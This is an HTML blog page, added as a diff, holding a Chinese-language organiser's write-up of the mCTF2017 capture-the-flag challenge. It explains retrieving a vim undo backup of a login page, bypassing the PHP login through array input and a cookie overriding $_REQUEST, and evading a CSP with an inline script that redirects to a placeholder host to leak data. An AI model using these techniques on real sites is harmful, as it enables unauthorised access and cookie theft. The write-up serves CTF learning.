@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<title>mCTF2017 writeup &ndash; # alert`D0n9` ｜ 输攻墨守</title>
+	<link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/nav.css">
+    
+    
+    
+    
+    
+	<link rel="stylesheet" href="/css/themes/light.css">
+</head>
+<body>
+	<input class="show-hide-menu-input" style="display:none;" autocomplete="off" type="checkbox" id="toggle-1">
+	<label class="overlay" for="toggle-1"></label>
+	<div class="main">
+		<header class="header">
+			<div class="header-content">
+				<div class="title">
+					<a href="http://localhost:1313/"># alert`D0n9` ｜ 输攻墨守</a>
+				</div>
+				<div>
+					<div class="header-right">
+						<label id="show-hide-menu-label" class="clickable-header-label" for="toggle-1">
+							<img class="color-adapting-image" width="30" src="/images/hamburger.svg" alt="menu button">
+						</label>
+					</div>
+					<div class="dont-show">
+						<p>
+							Links:
+						</p>
+					</div>
+					<ul class="links">
+						<li><a href="/">Home</a></li>
+						<li><a href="/posts/">Posts</a></li>
+						<li><a href="/about-me/">About Me</a></li>
+						<li><a href="/tags/">Tags</a></li>
+					</ul>
+				</div>
+			</div>
+		</header>
+		<main class="body">
+			<div class="body-content">
+  <header class="title-header">
+    <h1>mCTF2017 writeup</h1>
+    <div class="title-header-date">
+        <time>Saturday, March 25, 2017</time>
+    </div>
+    
+  </header>
+  <h2 id="mctf2017--writeup">mCTF2017  writeup<aside class="heading-anchor"><a href="#mctf2017--writeup" aria-label="Anchor"><img src="/images/chain-link.svg" class="color-adapting-image" height="20"></a></aside></h2>
+<p>选手 writeup</p>
+<p>@__画船听雨  <a href="https://pan.baidu.com/s/1sljPuzV">https://pan.baidu.com/s/1sljPuzV</a>
+@王松_Striker  <a href="http://pan.baidu.com/s/1miOBarA">http://pan.baidu.com/s/1miOBarA</a> 密码: gpga
+@pcat  <a href="http://pan.baidu.com/s/1i4S4CNb">http://pan.baidu.com/s/1i4S4CNb</a> 密码：gb1f</p>
+<hr>
+<p>大致是Web+Misc的出题方向思路，看了一些大佬发给的writeup，没有和预期的做题思路有太大偏差，其实题目也没涉及什么奇技淫巧，仔细看官方文档都能解决。</p>
+<p>在微信公众里回复<!-- raw HTML omitted -->CTF<!-- raw HTML omitted -->关键字，拿到题目信息</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171706150.png" alt=""></p>
+<p>提示很明显，<em><strong>这个邮箱会告诉你更多</strong></em>，向邮箱发任意消息会得到一个自动回复，内容是百度云盘里的一个zip包。</p>
+<p>这里有个小问题，可能不会对某些邮箱或者进入垃圾箱的邮件自动回复，好在刚开始就发现了这个问题，后面改了公众号回复，把下载百度云盘直接贴出来了。</p>
+<p>拿到zip，解压出来有一个<!-- raw HTML omitted -->被发现了.cap<!-- raw HTML omitted -->，很基础的流量审计题目，主要目的是从中拿到1.zip</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171707268.png" alt=""></p>
+<p>然后其实zip是修改hex后的伪加密，这一步有多种解法，最简单直接<strong>cat</strong>，解开后里面的txt就是线上做题地址了。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171707745.png" alt=""></p>
+<p>拿到线上做题地址，打开看到是登录页面，后面分析access.log，这个页面很多sqlmap请求，看来有一部分人还是会想到注入，其实如果经常关注p牛博客的话，可能会对这句话有印象</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171707713.png" alt=""></p>
+<p>哈哈，有理有据，这次也不例外，也是需要拿到登录页面的源码，常规的源码泄露思路也就是那些吧，备份习惯和编辑器问题啥的。</p>
+<p>这时候就会有人开脚本扫了，但应该不会有什么收获，还可能被Ban IP，其实也并没有开Waf，貌似是阿里云给当成了ddos攻击</p>
+<p>然后越来越多人在扫文件，怕这时候有人乱搞，考虑放出第一次hint</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171707203.png" alt=""></p>
+<p>关键字：<!-- raw HTML omitted -->vim、文件备份，官方文档<!-- raw HTML omitted --></p>
+<p>接下来就很容易了吧，去翻一翻vim文档，
+<a href="http://vimhelp.appspot.com/vim_faq.txt.html#faq-7.2">Vim: vim_faq.txt</a>
+<img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171708205.png" alt=""></p>
+<p>Soga，还有un~这种的，vim就是叼，vim就是强。构造这样的链接</p>
+<p><strong>http://60.205.183.92/mCTF2017/.login.php.un.~</strong></p>
+<p>后面在审计access.log的时候看到在放hint之前就有人fuzz到了这个文件名称，但是前面少了点，失之交臂，一般像这种备份文件都是会隐藏了的，Linux下隐藏文件就是在文件名前面加点。</p>
+<p>拿到源码后看登录逻辑，addslashes和md5()后带入sql查询，首先排除掉有注入，然后一开始有个判断password不能是空，不然就die，然后在setcookie前有个判断。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;../img/config-db.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Security-Policy: default-src &#39;none&#39;; script-src &#39;none&#39; &#39;unsafe-inline&#39;; style-src &#39;self&#39;; img-src &#39;self&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">submit</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">pass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">password</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$user</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">username</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">password</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select `passwd` from users where user=&#39;</span><span class="si">{</span><span class="nv">$user</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$passwd</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$mCTF_Cookie</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$user</span><span class="o">.</span><span class="nx">time</span><span class="p">()</span><span class="o">.</span><span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1000</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;mCTF2017&#39;</span><span class="p">,</span> <span class="nv">$mCTF_Cookie</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="s2">&#34;/mCTF2017&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">mysql_query</span><span class="p">(</span><span class="s2">&#34;INSERT INTO `Cookie` (`userid`,`cookie`) VALUES (&#39;</span><span class="si">{</span><span class="nv">$user</span><span class="si">}</span><span class="s2">&#39;,&#39;</span><span class="si">{</span><span class="nv">$mCTF_Cookie</span><span class="si">}</span><span class="s2">&#39;)&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location:main.php&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$error</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">{</span><span class="nv">$user</span><span class="si">}</span><span class="s2">不存在或密码错误&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;title&gt;Login&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;link rel=&#34;stylesheet&#34; href=&#34;css/style.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;div id=&#34;login&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;form action=&#34;login.php&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;span class=&#34;fontawesome-user&#34;&gt;&lt;/span&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;input type=&#34;text&#34; name=&#34;username&#34; value=&#34;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;span class=&#34;fontawesome-lock&#34;&gt;&lt;/span&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;input type=&#34;password&#34; name=&#34;password&#34; value=&#34;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">		&lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Login&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">	&lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php echo $error; ?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
+</span></span></span></code></pre></div><p>主要要看的逻辑在这里，这个是从其他CTF中学到的trick，如果<!-- raw HTML omitted -->$&lt;$passwd <!-- raw HTML omitted -->就会为null，然后sql查询的是user，如果在数据表里查不到也是会返回False，False后的也是一个数组，则会恒等。
+参考：http://www.mauu.me/?p=210</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">	<span class="nv">$user</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">username</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nx">password</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select `passwd` from users where user=&#39;</span><span class="si">{</span><span class="nv">$user</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_row</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$passwd</span><span class="p">);</span>
+</span></span></code></pre></div><p>但是直接**$password[]=<strong>是不行的，因为前面还有不能为空的判断，不过取值却用了</strong>*$_REQUEST***，我们知道***$_REQUEST***是能接受GET和POST，但是POST会覆盖GET（默认是这样，具体要看php.ini里的设置），最后取到POST中的password还是会die。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">password</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span></code></pre></div><p>翻文档里这样介绍***$_REQUEST***，这里没搞好，本意是想让大佬们关注一下<strong>php.ini</strong>相关的设置，但是cookie这个点太容易就能想到，就变得不好玩了。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171709157.png" alt=""></p>
+<hr>
+<p>在php5.X以上php.ini里variables_order和request_order会影响$_REQUEST接收和解析顺序。</p>
+<p>variables_order默认是‘EGPCS’，解析顺序从左到右，后解析新值覆盖旧值。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">S = $_SERVER
+</span></span><span class="line"><span class="cl">C = $_Cookie
+</span></span><span class="line"><span class="cl">P = $_POST
+</span></span><span class="line"><span class="cl">G = $_GET
+</span></span><span class="line"><span class="cl">E = $_ENV
+</span></span></code></pre></div><p>php5.3.0后引入request_order，是专为*$_REQUEST*而引入的，出于安全考虑默认为‘GP’，不包含C（Cookie），解析顺序也是从左到右，后解析新值覆盖旧值。如果request_order为空，则遵循variables_order。
+需要注意，variables_order不接收$_REQUEST。</p>
+<hr>
+<p>前面判断是否为空用的$_REQUEST，因为php.ini中request_order=“GPC”，$_REQUEST先取到POST，然后Cookie会覆盖，从而可以通过。</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171709727.png" alt=""></p>
+<p>顺利登陆后到了一个留言页面，秉着见框就X得职业本能，肯定要测试XSS，不过没这么简单，这里加入了CSP策略，需要注意script-src的设置，&lsquo;unsafe-inline&rsquo;表示可以用内联脚本，就是可以构造&lt;script&gt;，但不能src一个外部js文件，真就安全了吗？</p>
+<p><code>Content-Security-Policy: default-src 'none'; script-src 'none' 'unsafe-inline'; style-src 'self'; img-src 'self'</code></p>
+<p>其实这里有几种办法可以绕，使用dns预读取可以绕过，有点像使用Cloudeye带数据，也可以使用跳转带出referer。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;http://xxxx.com/&#34;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></span></code></pre></div><p>更多大佬是使用直接跳转，访问referer里带的后台地址也会直接Set-Cookie，写代码时考虑过这点，一开始是有权限验证的，在上午出了点问题，索性就取消了。</p>
+<p>拿到Cookie也不是最终的Flag，熟悉base编码字符集的同学可能会发现这个是经过base32编码后的，base32解码后拿到最终Flag</p>
+<p><img src="https://raw.githubusercontent.com/D0n9/static-repo/main/images/2017/03/202402171710763.png" alt=""></p>
+<hr>
+
+  
+  
+  <div class="post-tags">
+    <p>Tags: 
+    
+      <a href="/tags/writeup">Writeup</a>
+    
+      <a href="/tags/ctf">CTF</a>
+    
+    </p>
+  </div>
+  
+
+			</div>
+		</main>
+	</div>
+	<hr class="dont-show">
+	<footer class="footer">
+		<p>Powered by <a href="https://gohugo.io/">Hugo</a> &amp; <a href="https://github.com/stevenengler/no-js-hugo-theme">no-js-hugo-theme</a></p>
+	</footer>
+</body>
+</html>
